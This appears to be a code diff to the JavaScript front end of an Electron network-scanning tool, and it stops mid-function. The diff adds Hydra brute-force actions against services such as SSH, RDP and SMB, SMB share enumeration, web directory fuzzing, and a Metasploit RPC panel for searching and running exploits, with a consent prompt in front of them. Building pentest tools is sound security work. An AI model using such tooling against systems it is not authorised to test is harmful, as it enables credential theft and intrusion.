@@ -16,11 +16,28 @@ function escapeHtml(unsafe) {
 }
 
 // --- Initialization ---
-Promise.all([api.checkNmap(), api.settings.checkDependency('tshark')]).then(async ([isNmapInstalled, tsharkStatus]) => {
+Promise.all([
+  api.checkNmap(),
+  api.settings.checkDependency('tshark'),
+  api.settings.checkDependency('hydra'),
+  api.settings.checkDependency('msfrpcd'),
+  api.settings.checkDependency('smbclient'),
+]).then(async ([isNmapInstalled, tsharkStatus, hydraStatus, msfrpcdStatus, smbclientStatus]) => {
   const isTsharkInstalled = tsharkStatus ? tsharkStatus.installed : false;
+  const isHydraInstalled = hydraStatus ? hydraStatus.installed : false;
+  const isMsfrpcdInstalled = msfrpcdStatus ? msfrpcdStatus.installed : false;
+  const isSmbclientInstalled = smbclientStatus ? smbclientStatus.installed : false;
   state.isNmapInstalled = isNmapInstalled;
   state.isTsharkInstalled = isTsharkInstalled;
-  
+  state.isHydraInstalled = isHydraInstalled;
+  state.isMsfrpcdInstalled = isMsfrpcdInstalled;
+  state.isSmbclientInstalled = isSmbclientInstalled;
+
+  // Show the Shares button when smbclient is installed
+  if (isSmbclientInstalled) {
+    document.querySelectorAll('.smbclient-only').forEach(el => { el.style.display = ''; });
+  }
+
   if (isNmapInstalled) {
     state.nmapScripts = await api.getNmapScripts();
     console.log(`Loaded ${state.nmapScripts?.length || 0} native Nmap scripts from backend.`);
@@ -33,6 +50,9 @@ Promise.all([api.checkNmap(), api.settings.checkDependency('tshark')]).then(asyn
   const missing = [];
   if (!isNmapInstalled) missing.push({ name: 'Nmap', url: 'https://nmap.org/download.html' });
   if (!isTsharkInstalled) missing.push({ name: 'Tshark (Wireshark)', url: 'https://www.wireshark.org/download.html' });
+  if (!isHydraInstalled) missing.push({ name: 'Hydra (THC-Hydra)', url: 'https://github.com/vanhauser-thc/thc-hydra' });
+  if (!isMsfrpcdInstalled) missing.push({ name: 'Metasploit Framework (msfrpcd)', url: 'https://www.metasploit.com/download' });
+  if (!isSmbclientInstalled) missing.push({ name: 'smbclient (Samba Tools)', url: 'https://www.samba.org/samba/download/' });
   
   if (missing.length > 0) {
     if (elements.nmapInstallBanner) {
@@ -74,6 +94,14 @@ const toggleNmap = document.getElementById('setting-nmap-enabled');
 const statusNmap = document.getElementById('status-nmap');
 const toggleTshark = document.getElementById('setting-tshark-enabled');
 const statusTshark = document.getElementById('status-tshark');
+const toggleHydra = document.getElementById('setting-hydra-enabled');
+const statusHydra = document.getElementById('status-hydra');
+const toggleMsfrpcd = document.getElementById('setting-msfrpcd-enabled');
+const statusMsfrpcd = document.getElementById('status-msfrpcd');
+const toggleSmbclient = document.getElementById('setting-smbclient-enabled');
+const statusSmbclient = document.getElementById('status-smbclient');
+const toggleShowmount = document.getElementById('setting-showmount-enabled');
+const statusShowmount = document.getElementById('status-showmount');
 
 // VLAN Discovery DOM elements
 const btnToggleVlanPanel = document.getElementById('btn-toggle-vlan-panel');
@@ -152,6 +180,42 @@ async function loadAndApplySettings() {
     toggleEl: toggleTshark,
   });
 
+  await syncDependencyToggle({
+    checkFn: () => api.settings.checkDependency('hydra'),
+    installedText: 'Installed',
+    missingText: 'Not Found — Install THC-Hydra',
+    statusEl: statusHydra,
+    settingsKey: 'hydra',
+    toggleEl: toggleHydra,
+  });
+
+  await syncDependencyToggle({
+    checkFn: () => api.settings.checkDependency('msfrpcd'),
+    installedText: 'Installed',
+    missingText: 'Not Found — Install Metasploit Framework',
+    statusEl: statusMsfrpcd,
+    settingsKey: 'msfrpcd',
+    toggleEl: toggleMsfrpcd,
+  });
+
+  await syncDependencyToggle({
+    checkFn: () => api.settings.checkDependency('smbclient'),
+    installedText: 'Installed',
+    missingText: 'Not Found — Install samba-client (Linux/macOS) or Samba (Windows)',
+    statusEl: statusSmbclient,
+    settingsKey: 'smbclient',
+    toggleEl: toggleSmbclient,
+  });
+
+  await syncDependencyToggle({
+    checkFn: () => api.settings.checkDependency('showmount'),
+    installedText: 'Installed',
+    missingText: 'Not Found — Install nfs-common (Linux) or use built-in (macOS)',
+    statusEl: statusShowmount,
+    settingsKey: 'showmount',
+    toggleEl: toggleShowmount,
+  });
+
   applySettingsUI(settings);
 }
 
@@ -175,6 +239,24 @@ function applySettingsUI(settings) {
         elements.sidebarResizer.style.display = 'none';
      }
   }
+
+  // Hide/Show Hydra UI components globally
+  const hydraEnabled = settings.hydra?.enabled !== false;
+  document.querySelectorAll('.hydra-only').forEach(el => {
+    el.style.display = hydraEnabled ? 'flex' : 'none';
+  });
+
+  // Hide/Show Metasploit UI components globally
+  const msfrpcdEnabled = settings.msfrpcd?.enabled !== false;
+  document.querySelectorAll('.msfrpcd-only').forEach(el => {
+    el.style.display = msfrpcdEnabled ? 'flex' : 'none';
+  });
+
+  // Hide/Show smbclient UI components globally
+  const smbclientEnabled = settings.smbclient?.enabled !== false;
+  document.querySelectorAll('.smbclient-only').forEach(el => {
+    el.style.display = smbclientEnabled ? '' : 'none';
+  });
 }
 
 toggleNmap.addEventListener('change', async (e) => {
@@ -187,6 +269,28 @@ toggleTshark.addEventListener('change', async (e) => {
   await api.settings.set('tshark.enabled', e.target.checked);
   const settings = await api.settings.getAll();
   applySettingsUI(settings);
+});
+
+toggleHydra.addEventListener('change', async (e) => {
+  await api.settings.set('hydra.enabled', e.target.checked);
+  const settings = await api.settings.getAll();
+  applySettingsUI(settings);
+});
+
+toggleMsfrpcd.addEventListener('change', async (e) => {
+  await api.settings.set('msfrpcd.enabled', e.target.checked);
+  const settings = await api.settings.getAll();
+  applySettingsUI(settings);
+});
+
+toggleSmbclient?.addEventListener('change', async (e) => {
+  await api.settings.set('smbclient.enabled', e.target.checked);
+  const settings = await api.settings.getAll();
+  applySettingsUI(settings);
+});
+
+toggleShowmount?.addEventListener('change', async (e) => {
+  await api.settings.set('showmount.enabled', e.target.checked);
 });
 
 
@@ -925,6 +1029,18 @@ function renderActionButtons(container, ip, data) {
     btn.addEventListener('click', () => window.electronAPI.openExternalAction({type:'rdp', ip}));
     container.appendChild(btn);
   }
+
+  // Brute-Force action for brute-forceable ports
+  const bfPorts = { 22: 'ssh', 21: 'ftp', 445: 'smb', 3389: 'rdp', 80: 'http-get', 8080: 'http-get', 23: 'telnet', 3306: 'mysql', 1433: 'mssql', 5432: 'postgres', 5900: 'vnc' };
+  if (bfPorts[data.port] && state.isHydraInstalled) {
+    const bfBtn = document.createElement('button');
+    bfBtn.className = 'btn-action pentest-action hydra-only';
+    bfBtn.innerHTML = '<span class="icon">⚔️</span> Brute-Force';
+    bfBtn.addEventListener('click', () => {
+      openBruteForceModal(ip, data.port, bfPorts[data.port]);
+    });
+    container.appendChild(bfBtn);
+  }
 }
 
 function openDetailsPanel(host) {
@@ -1231,6 +1347,83 @@ function openDetailsPanel(host) {
     });
   } else {
     portsList.insertAdjacentHTML('beforeend', '<span class="value">No common open ports detected.</span>');
+  }
+
+  // Share Enumeration quick-action for SMB hosts (port 139/445)
+  if (host.ports && (host.ports.includes(445) || host.ports.includes(139)) && state.isSmbclientInstalled) {
+    const shareSection = document.createElement('div');
+    shareSection.className = 'smbclient-only';
+    shareSection.style.cssText = 'margin-top: 10px; display: flex; align-items: center; gap: 8px;';
+    const shareLabel = document.createElement('span');
+    shareLabel.style.cssText = 'font-size: 11px; color: var(--text-muted);';
+    shareLabel.textContent = '📂 Shares:';
+    shareSection.appendChild(shareLabel);
+    const shareBtn = document.createElement('button');
+    shareBtn.className = 'btn-action pentest-action';
+    shareBtn.style.cssText = 'font-size: 10px; padding: 3px 8px;';
+    shareBtn.textContent = 'Enumerate Shares';
+    shareBtn.addEventListener('click', () => openSharePanel(host.ip));
+    shareSection.appendChild(shareBtn);
+    portsList.parentElement.appendChild(shareSection);
+  }
+
+  // Dir Fuzzer quick-action for HTTP/HTTPS hosts
+  if (host.ports) {
+    const HTTP_PORTS = [80, 443, 8080, 8443, 8000, 8888, 3000, 5000];
+    const webPorts = host.ports.filter(p => HTTP_PORTS.includes(p));
+    if (webPorts.length > 0) {
+      const fuzzSection = document.createElement('div');
+      fuzzSection.style.cssText = 'margin-top: 10px; display: flex; align-items: center; gap: 8px; flex-wrap: wrap;';
+      const fuzzLabel = document.createElement('span');
+      fuzzLabel.style.cssText = 'font-size: 11px; color: var(--text-muted);';
+      fuzzLabel.textContent = '🔎 Dir Fuzz:';
+      fuzzSection.appendChild(fuzzLabel);
+      webPorts.forEach(port => {
+        const scheme = (port === 443 || port === 8443) ? 'https' : 'http';
+        const url = `${scheme}://${host.ip}:${port}`;
+        const btn = document.createElement('button');
+        btn.className = 'btn-action pentest-action';
+        btn.style.cssText = 'font-size: 10px; padding: 3px 8px;';
+        btn.textContent = `${scheme.toUpperCase()}:${port}`;
+        btn.title = `Fuzz web directories on ${url}`;
+        btn.addEventListener('click', () => {
+          if (typeof openDirFuzzPanel !== 'undefined') openDirFuzzPanel(url);
+          else if (window.__openDirFuzzPanel) window.__openDirFuzzPanel(url);
+        });
+        fuzzSection.appendChild(btn);
+      });
+      portsList.parentElement.appendChild(fuzzSection);
+    }
+  }
+
+  // Brute-Force quick-actions for detected ports (visible when Hydra is installed + enabled)
+  if (host.ports && host.ports.length > 0 && state.isHydraInstalled) {
+    const bfPorts = { 22: 'ssh', 21: 'ftp', 445: 'smb', 3389: 'rdp', 80: 'http-get', 8080: 'http-get', 23: 'telnet', 3306: 'mysql', 1433: 'mssql', 5432: 'postgres', 5900: 'vnc' };
+    const matchingPorts = host.ports.filter(p => bfPorts[p]);
+    if (matchingPorts.length > 0) {
+      const bfSection = document.createElement('div');
+      bfSection.className = 'hydra-only';
+      bfSection.style.cssText = 'margin-top: 12px; display: flex; flex-wrap: wrap; gap: 6px; align-items: center;';
+      
+      const bfLabel = document.createElement('span');
+      bfLabel.style.cssText = 'font-size: 11px; color: var(--text-muted); margin-right: 4px;';
+      bfLabel.textContent = '⚔️ Brute-Force:';
+      bfSection.appendChild(bfLabel);
+
+      matchingPorts.forEach(port => {
+        const btn = document.createElement('button');
+        btn.className = 'btn-action pentest-action';
+        btn.style.cssText = 'font-size: 10px; padding: 3px 8px;';
+        btn.innerHTML = `${bfPorts[port].toUpperCase()} :${port}`;
+        btn.title = `Brute-force ${bfPorts[port]} on port ${port}`;
+        btn.addEventListener('click', () => {
+          openBruteForceModal(host.ip, port, bfPorts[port]);
+        });
+        bfSection.appendChild(btn);
+      });
+
+      portsList.parentElement.appendChild(bfSection);
+    }
   }
 
   if (host.nmapData && host.nmapData.vulnerabilities && host.nmapData.vulnerabilities.length > 0) {
@@ -3565,3 +3758,1613 @@ window.electronAPI.onSnmpWalkError && window.electronAPI.onSnmpWalkError(({ host
   el.appendChild(body);
   container.appendChild(el);
 });
+
+// =============================================
+// === OFFENSIVE PENTEST: BRUTE-FORCE MODULE ===
+// =============================================
+
+let isBfRunning = false;
+let bfAttemptCount = 0;
+let pentestConsentAccepted = false;
+let pendingBfConfig = null; // Holds {ip, port, protocol} while consent is pending
+
+// --- Consent Flow ---
+const pentestConsentOverlay = document.getElementById('pentest-consent-overlay');
+const btnClosePentestConsent = document.getElementById('btn-close-pentest-consent');
+const btnPentestConsentReject = document.getElementById('btn-pentest-consent-reject');
+const btnPentestConsentAccept = document.getElementById('btn-pentest-consent-accept');
+
+function closePentestConsent() {
+  pentestConsentOverlay?.classList.add('hidden');
+  pendingBfConfig = null;
+}
+
+btnClosePentestConsent?.addEventListener('click', closePentestConsent);
+btnPentestConsentReject?.addEventListener('click', closePentestConsent);
+
+btnPentestConsentAccept?.addEventListener('click', async () => {
+  pentestConsentAccepted = true;
+  // Persist consent
+  await api.settings.set('pentestConsentAccepted', true);
+  pentestConsentOverlay?.classList.add('hidden');
+  if (pendingBfConfig) {
+    const cfg = pendingBfConfig;
+    pendingBfConfig = null;
+    if (cfg._type === 'dirfuzz') {
+      runDirFuzz();
+    } else {
+      showBruteForceModal(cfg.ip, cfg.port, cfg.protocol);
+    }
+  }
+});
+
+// Check persisted consent on load
+api.settings.get('pentestConsentAccepted').then(val => {
+  pentestConsentAccepted = !!val;
+});
+
+// --- Brute-Force Modal ---
+const bfOverlay = document.getElementById('bruteforce-modal-overlay');
+const btnCloseBfModal = document.getElementById('btn-close-bf-modal');
+const bfTargetIp = document.getElementById('bf-target-ip');
+const bfPort = document.getElementById('bf-port');
+const bfProtocol = document.getElementById('bf-protocol');
+const bfUsername = document.getElementById('bf-username');
+const bfWordlistPath = document.getElementById('bf-wordlist-path');
+const btnBfBrowseWordlist = document.getElementById('btn-bf-browse-wordlist');
+const bfThreads = document.getElementById('bf-threads');
+const bfThreadsVal = document.getElementById('bf-threads-val');
+const bfDelay = document.getElementById('bf-delay');
+const bfMaxAttempts = document.getElementById('bf-max-attempts');
+const btnBfStart = document.getElementById('btn-bf-start');
+const btnBfStop = document.getElementById('btn-bf-stop');
+const bfProgressContainer = document.getElementById('bf-progress-container');
+const bfProgressFill = document.getElementById('bf-progress-fill');
+const bfProgressText = document.getElementById('bf-progress-text');
+const bfResultsBody = document.getElementById('bf-results-body');
+const bfErrorDisplay = document.getElementById('bf-error-display');
+
+// Protocol → default port map
+const protocolPortMap = {
+  'ssh': 22, 'ftp': 21, 'smb': 445, 'rdp': 3389,
+  'http-get': 80, 'http-post': 80, 'telnet': 23,
+  'mysql': 3306, 'mssql': 1433, 'postgres': 5432, 'vnc': 5900
+};
+
+/**
+ * Open the brute-force modal. Checks consent first.
+ */
+function openBruteForceModal(ip, port, protocol) {
+  if (!pentestConsentAccepted) {
+    pendingBfConfig = { ip, port, protocol };
+    pentestConsentOverlay?.classList.remove('hidden');
+    return;
+  }
+  showBruteForceModal(ip, port, protocol);
+}
+
+function showBruteForceModal(ip, port, protocol) {
+  resetBfModal();
+  if (bfTargetIp) bfTargetIp.value = ip || '';
+  if (bfPort) bfPort.value = port || 22;
+  if (bfProtocol) bfProtocol.value = protocol || 'ssh';
+  bfOverlay?.classList.remove('hidden');
+}
+
+function closeBfModal() {
+  bfOverlay?.classList.add('hidden');
+}
+
+function resetBfModal() {
+  isBfRunning = false;
+  bfAttemptCount = 0;
+  if (btnBfStart) { btnBfStart.disabled = false; btnBfStart.classList.remove('pulsing'); }
+  if (btnBfStop) btnBfStop.disabled = true;
+  if (bfProgressContainer) bfProgressContainer.style.display = 'none';
+  if (bfProgressFill) bfProgressFill.style.width = '0%';
+  if (bfProgressText) bfProgressText.textContent = '0 attempts';
+  if (bfResultsBody) bfResultsBody.innerHTML = '<tr><td colspan="4" style="text-align:center; color: var(--text-muted); padding: 16px;">Configure and start an attack above</td></tr>';
+  if (bfErrorDisplay) { bfErrorDisplay.style.display = 'none'; bfErrorDisplay.textContent = ''; }
+}
+
+btnCloseBfModal?.addEventListener('click', closeBfModal);
+
+// Thread slider live value update
+bfThreads?.addEventListener('input', () => {
+  if (bfThreadsVal) bfThreadsVal.textContent = bfThreads.value;
+});
+
+// Protocol → port auto-sync
+bfProtocol?.addEventListener('change', () => {
+  const defaultPort = protocolPortMap[bfProtocol.value];
+  if (defaultPort && bfPort) bfPort.value = defaultPort;
+});
+
+// Password wordlist file picker (native OS dialog)
+btnBfBrowseWordlist?.addEventListener('click', async () => {
+  try {
+    const result = await api.browseFile({
+      title: 'Select Password Wordlist',
+      filters: [
+        { name: 'Text Files', extensions: ['txt', 'lst', 'dict'] },
+        { name: 'All Files', extensions: ['*'] }
+      ],
+    });
+    if (result.status === 'selected' && result.path) {
+      if (bfWordlistPath) bfWordlistPath.value = result.path;
+    }
+  } catch (err) {
+    showBfError(`Failed to open file dialog: ${err.message}`);
+  }
+});
+
+// Start Attack
+btnBfStart?.addEventListener('click', async () => {
+  const targetIp = bfTargetIp?.value?.trim();
+  const port = parseInt(bfPort?.value, 10);
+  const protocol = bfProtocol?.value;
+  const username = bfUsername?.value?.trim();
+  const wordlistPath = bfWordlistPath?.value?.trim();
+  const threads = parseInt(bfThreads?.value, 10) || 4;
+  const delay = parseInt(bfDelay?.value, 10) || 0;
+  const maxAttempts = parseInt(bfMaxAttempts?.value, 10) || 10000;
+
+  // Client-side validation
+  if (!targetIp) { showBfError('Target IP is required'); return; }
+  if (!port || port < 1 || port > 65535) { showBfError('Invalid port (1-65535)'); return; }
+  if (!username) { showBfError('Username is required'); return; }
+  if (!wordlistPath) { showBfError('Wordlist path is required'); return; }
+
+  hideBfError();
+  bfAttemptCount = 0;
+  isBfRunning = true;
+
+  // Update UI state
+  btnBfStart.disabled = true;
+  btnBfStart.classList.add('pulsing');
+  btnBfStop.disabled = false;
+  bfProgressContainer.style.display = 'block';
+  bfProgressFill.style.width = '0%';
+  bfProgressText.textContent = 'Starting...';
+  bfResultsBody.innerHTML = '';
+
+  try {
+    await api.startBruteForce({
+      targetIp,
+      port,
+      protocol,
+      username,
+      wordlistPath,
+      threads,
+      delay,
+      maxAttempts,
+    });
+  } catch (err) {
+    showBfError(`Failed to start: ${err.message}`);
+    resetBfState();
+  }
+});
+
+// Stop Attack
+btnBfStop?.addEventListener('click', async () => {
+  try {
+    await api.stopBruteForce();
+  } catch (_) { /* ignore */ }
+  resetBfState();
+});
+
+function resetBfState() {
+  isBfRunning = false;
+  if (btnBfStart) { btnBfStart.disabled = false; btnBfStart.classList.remove('pulsing'); }
+  if (btnBfStop) btnBfStop.disabled = true;
+}
+
+function showBfError(msg) {
+  if (bfErrorDisplay) {
+    bfErrorDisplay.textContent = msg;
+    bfErrorDisplay.style.display = 'block';
+  }
+}
+
+function hideBfError() {
+  if (bfErrorDisplay) {
+    bfErrorDisplay.textContent = '';
+    bfErrorDisplay.style.display = 'none';
+  }
+}
+
+function formatBfTime(isoString) {
+  try {
+    const d = new Date(isoString);
+    return d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+  } catch { return '--:--:--'; }
+}
+
+// --- Brute-Force IPC Event Listeners ---
+
+window.electronAPI.onBruteForceAttempt((data) => {
+  bfAttemptCount = data.attemptNumber || (bfAttemptCount + 1);
+  if (bfProgressText) {
+    bfProgressText.textContent = `${bfAttemptCount} attempts`;
+  }
+  // Only show every 10th attempt to avoid flooding the DOM
+  if (bfAttemptCount % 10 === 0 || bfAttemptCount <= 5) {
+    const row = document.createElement('tr');
+    row.className = 'bf-attempt-row';
+    row.innerHTML = `<td>${formatBfTime(data.timestamp)}</td><td colspan="2" style="font-family: monospace; font-size: 10px;">${escapeHtml(data.line?.substring(0, 80) || '...')}</td><td style="color: var(--text-muted);">⏳</td>`;
+    bfResultsBody?.appendChild(row);
+    // Auto-scroll
+    const container = document.getElementById('bf-results-container');
+    if (container) container.scrollTop = container.scrollHeight;
+  }
+});
+
+window.electronAPI.onBruteForceResult((data) => {
+  const row = document.createElement('tr');
+  row.className = 'bf-credential-hit';
+  row.innerHTML = `<td>${formatBfTime(data.timestamp)}</td><td><strong>${escapeHtml(data.user)}</strong></td><td><strong>${escapeHtml(data.password)}</strong> <span class="bf-copy-btn" title="Copy credential">📋</span></td><td style="color: var(--success);">✅</td>`;
+  
+  // Copy-to-clipboard on the copy button
+  const copyBtn = row.querySelector('.bf-copy-btn');
+  if (copyBtn) {
+    copyBtn.addEventListener('click', () => {
+      navigator.clipboard.writeText(`${data.user}:${data.password}`);
+      copyBtn.textContent = '✔️';
+      setTimeout(() => { copyBtn.textContent = '📋'; }, 2000);
+    });
+  }
+
+  bfResultsBody?.prepend(row); // Show hits at top
+});
+
+window.electronAPI.onBruteForceProgress((data) => {
+  if (bfProgressText) {
+    bfProgressText.textContent = `${data.attemptCount || bfAttemptCount} attempts | ${data.foundCount || 0} found | ${data.statusText || ''}`;
+  }
+  // Estimate progress (rough — based on attempt count vs max)
+  const max = parseInt(bfMaxAttempts?.value, 10) || 10000;
+  const pct = Math.min(((data.attemptCount || bfAttemptCount) / max) * 100, 100);
+  if (bfProgressFill) bfProgressFill.style.width = `${pct}%`;
+});
+
+window.electronAPI.onBruteForceError((data) => {
+  showBfError(data.message || 'Unknown brute-force error');
+});
+
+window.electronAPI.onBruteForceComplete((data) => {
+  resetBfState();
+  if (bfProgressFill) bfProgressFill.style.width = '100%';
+  
+  const found = data.credentialsFound?.length || 0;
+  const summary = `Complete — ${data.totalAttempts || 0} attempts, ${found} credential${found !== 1 ? 's' : ''} found (exit code ${data.exitCode})`;
+  if (bfProgressText) bfProgressText.textContent = summary;
+
+  if (data.stderr && data.exitCode !== 0) {
+    showBfError(`Hydra stderr: ${data.stderr.substring(0, 200)}`);
+  }
+});
+
+// =============================================
+// === METASPLOIT RPC UI MODULE ===
+// =============================================
+
+const msfModalOverlay = document.getElementById('msf-modal-overlay');
+const btnCloseMsfModal = document.getElementById('btn-close-msf-modal');
+const msfStatusDot = document.getElementById('msf-status-dot');
+const msfStatusLabel = document.getElementById('msf-status-label');
+const msfHostLabel = document.getElementById('msf-host-label');
+const msfHost = document.getElementById('msf-host');
+const msfPort = document.getElementById('msf-port');
+const msfUsername = document.getElementById('msf-username');
+const msfPassword = document.getElementById('msf-password');
+const msfSsl = document.getElementById('msf-ssl');
+const btnMsfConnect = document.getElementById('btn-msf-connect');
+const btnMsfDisconnect = document.getElementById('btn-msf-disconnect');
+const msfRemoteWarning = document.getElementById('msf-remote-warning');
+const msfConnectForm = document.getElementById('msf-connect-form');
+const msfExploitSearch = document.getElementById('msf-exploit-search');
+const btnMsfSearch = document.getElementById('btn-msf-search');
+const msfExploitTbody = document.getElementById('msf-exploit-tbody');
+const msfSessionsContainer = document.getElementById('msf-sessions-container');
+const btnMsfRefreshSessions = document.getElementById('btn-msf-refresh-sessions');
+const msfErrorDisplay = document.getElementById('msf-error-display');
+
+// Run Exploit Modal
+const msfRunModalOverlay = document.getElementById('msf-run-modal-overlay');
+const btnCloseMsfRunModal = document.getElementById('btn-close-msf-run-modal');
+const msfRunModule = document.getElementById('msf-run-module');
+const msfRunTargetIp = document.getElementById('msf-run-target-ip');
+const msfRunTargetPort = document.getElementById('msf-run-target-port');
+const msfRunPayload = document.getElementById('msf-run-payload');
+const msfRunLhost = document.getElementById('msf-run-lhost');
+const msfRunLport = document.getElementById('msf-run-lport');
+const btnMsfRunExecute = document.getElementById('btn-msf-run-execute');
+const btnMsfRunCancel = document.getElementById('btn-msf-run-cancel');
+
+let msfConnected = false;
+
+// --- MSF Helper Functions ---
+
+function showMsfError(msg) {
+  if (!msfErrorDisplay) return;
+  msfErrorDisplay.textContent = msg;
+  msfErrorDisplay.style.display = 'block';
+  setTimeout(() => { msfErrorDisplay.style.display = 'none'; }, 8000);
+}
+
+function clearMsfError() {
+  if (msfErrorDisplay) msfErrorDisplay.style.display = 'none';
+}
+
+function updateMsfStatusUI(statusState, label) {
+  if (msfStatusDot) {
+    msfStatusDot.className = `msf-status-dot ${statusState}`;
+  }
+  if (msfStatusLabel) {
+    msfStatusLabel.textContent = label || statusState.charAt(0).toUpperCase() + statusState.slice(1);
+  }
+}
+
+function setMsfConnectedState(connected, host, port) {
+  msfConnected = connected;
+  if (connected) {
+    updateMsfStatusUI('connected', 'Connected');
+    if (msfHostLabel) msfHostLabel.textContent = `${host}:${port}`;
+    if (btnMsfConnect) btnMsfConnect.style.display = 'none';
+    if (btnMsfDisconnect) btnMsfDisconnect.style.display = '';
+    // Enable search and sessions
+    if (msfExploitSearch) msfExploitSearch.disabled = false;
+    if (btnMsfSearch) btnMsfSearch.disabled = false;
+    if (btnMsfRefreshSessions) btnMsfRefreshSessions.disabled = false;
+    // Disable form inputs
+    [msfHost, msfPort, msfUsername, msfPassword, msfSsl].forEach(el => {
+      if (el) el.disabled = true;
+    });
+  } else {
+    updateMsfStatusUI('disconnected', 'Disconnected');
+    if (msfHostLabel) msfHostLabel.textContent = '';
+    if (btnMsfConnect) btnMsfConnect.style.display = '';
+    if (btnMsfDisconnect) btnMsfDisconnect.style.display = 'none';
+    // Disable search and sessions
+    if (msfExploitSearch) msfExploitSearch.disabled = true;
+    if (btnMsfSearch) btnMsfSearch.disabled = true;
+    if (btnMsfRefreshSessions) btnMsfRefreshSessions.disabled = true;
+    // Enable form inputs
+    [msfHost, msfPort, msfUsername, msfPassword, msfSsl].forEach(el => {
+      if (el) el.disabled = false;
+    });
+  }
+}
+
+// --- MSF Modal Open/Close ---
+
+function openMsfModal() {
+  clearMsfError();
+  msfModalOverlay?.classList.remove('hidden');
+}
+
+function closeMsfModal() {
+  msfModalOverlay?.classList.add('hidden');
+}
+
+btnCloseMsfModal?.addEventListener('click', closeMsfModal);
+msfModalOverlay?.addEventListener('click', (e) => {
+  if (e.target === msfModalOverlay) closeMsfModal();
+});
+
+// --- MSF Tab Switching ---
+document.querySelectorAll('[data-msf-tab]').forEach(tab => {
+  tab.addEventListener('click', () => {
+    document.querySelectorAll('[data-msf-tab]').forEach(t => t.classList.remove('active'));
+    document.querySelectorAll('.msf-tab-pane').forEach(p => p.style.display = 'none');
+    tab.classList.add('active');
+    const pane = document.getElementById(`msf-tab-${tab.getAttribute('data-msf-tab')}`);
+    if (pane) pane.style.display = 'block';
+  });
+});
+
+// --- Non-localhost Warning ---
+msfHost?.addEventListener('input', () => {
+  const val = (msfHost.value || '').trim();
+  const isLocal = val === '127.0.0.1' || val === 'localhost' || val === '::1' || val === '';
+  if (msfRemoteWarning) msfRemoteWarning.style.display = isLocal ? 'none' : 'block';
+});
+
+// --- Connect ---
+btnMsfConnect?.addEventListener('click', async () => {
+  clearMsfError();
+  const host = (msfHost?.value || '127.0.0.1').trim();
+  const port = parseInt(msfPort?.value || '55553', 10);
+  const username = (msfUsername?.value || 'msf').trim();
+  const password = msfPassword?.value || '';
+  const ssl = msfSsl?.checked || false;
+
+  if (!password) {
+    showMsfError('Password is required');
+    msfPassword?.focus();
+    return;
+  }
+
+  updateMsfStatusUI('connecting', 'Connecting...');
+  btnMsfConnect.disabled = true;
+
+  try {
+    const result = await api.msfConnect({ host, port, username, password, ssl });
+    if (result.status === 'error') {
+      updateMsfStatusUI('error', 'Connection Failed');
+      showMsfError(result.error || 'Failed to connect');
+      btnMsfConnect.disabled = false;
+    } else {
+      setMsfConnectedState(true, host, port);
+      if (result.warning) showMsfError(result.warning);
+      // Auto-refresh sessions
+      refreshMsfSessions();
+    }
+  } catch (err) {
+    updateMsfStatusUI('error', 'Connection Failed');
+    showMsfError(err.message || 'Failed to connect');
+    btnMsfConnect.disabled = false;
+  }
+});
+
+// --- Disconnect ---
+btnMsfDisconnect?.addEventListener('click', async () => {
+  clearMsfError();
+  try {
+    await api.msfDisconnect();
+  } catch (_) { /* ignore */ }
+  setMsfConnectedState(false);
+  btnMsfConnect.disabled = false;
+  msfExploitTbody.innerHTML = '<tr><td colspan="5" style="text-align:center; color: var(--text-muted); padding: 24px;">Connect to msfrpcd and search for exploits</td></tr>';
+  msfSessionsContainer.innerHTML = '<div class="ds-record" style="text-align:center; color: var(--text-muted); opacity: 0.7; padding: 24px;">No active sessions</div>';
+});
+
+// --- Exploit Search ---
+let msfSearchTimeout = null;
+
+async function searchMsfExploits() {
+  const query = (msfExploitSearch?.value || '').trim();
+  if (!query) return;
+  if (!msfConnected) {
+    showMsfError('Not connected to Metasploit RPC');
+    return;
+  }
+
+  clearMsfError();
+  msfExploitTbody.innerHTML = '<tr><td colspan="5" style="text-align:center; color: var(--text-muted); padding: 24px;">Searching...</td></tr>';
+
+  try {
+    const result = await api.msfListExploits(query);
+    if (result.status === 'error') {
+      showMsfError(result.error);
+      msfExploitTbody.innerHTML = '<tr><td colspan="5" style="text-align:center; color: var(--danger); padding: 24px;">Search failed</td></tr>';
+      return;
+    }
+
+    const exploits = result.exploits || [];
+    if (exploits.length === 0) {
+      msfExploitTbody.innerHTML = '<tr><td colspan="5" style="text-align:center; color: var(--text-muted); padding: 24px;">No results found</td></tr>';
+      return;
+    }
+
+    msfExploitTbody.innerHTML = '';
+    exploits.slice(0, 100).forEach(mod => {
+      const row = document.createElement('tr');
+      const rankClass = (mod.rank || 'normal').toLowerCase();
+      row.innerHTML = `
+        <td style="font-family: monospace; font-size: 10px;" title="${escapeHtml(mod.fullname)}">${escapeHtml(mod.fullname || mod.name)}</td>
+        <td><span class="msf-rank ${escapeHtml(rankClass)}">${escapeHtml(mod.rank)}</span></td>
+        <td style="font-size: 10px; color: var(--text-muted);">${escapeHtml(mod.date)}</td>
+        <td style="font-size: 10px;" title="${escapeHtml(mod.description)}">${escapeHtml((mod.description || '').substring(0, 80))}${(mod.description || '').length > 80 ? '...' : ''}</td>
+        <td><button class="btn-msf-run" data-module="${escapeHtml(mod.fullname || mod.name)}">Run</button></td>
+      `;
+      msfExploitTbody.appendChild(row);
+    });
+  } catch (err) {
+    showMsfError(err.message);
+    msfExploitTbody.innerHTML = '<tr><td colspan="5" style="text-align:center; color: var(--danger); padding: 24px;">Search error</td></tr>';
+  }
+}
+
+btnMsfSearch?.addEventListener('click', searchMsfExploits);
+msfExploitSearch?.addEventListener('keydown', (e) => {
+  if (e.key === 'Enter') {
+    clearTimeout(msfSearchTimeout);
+    searchMsfExploits();
+  }
+});
+msfExploitSearch?.addEventListener('input', () => {
+  clearTimeout(msfSearchTimeout);
+  msfSearchTimeout = setTimeout(searchMsfExploits, 600);
+});
+
+// --- Run Exploit (from search table) ---
+msfExploitTbody?.addEventListener('click', (e) => {
+  const btn = e.target.closest('.btn-msf-run');
+  if (!btn) return;
+  const modulePath = btn.getAttribute('data-module');
+  if (!modulePath) return;
+  openRunExploitModal(modulePath);
+});
+
+function openRunExploitModal(modulePath, targetIp) {
+  clearMsfError();
+  if (msfRunModule) msfRunModule.value = modulePath;
+  if (msfRunTargetIp) msfRunTargetIp.value = targetIp || '';
+  if (msfRunTargetPort) msfRunTargetPort.value = '';
+  if (msfRunPayload) msfRunPayload.value = '';
+  if (msfRunLhost) msfRunLhost.value = '';
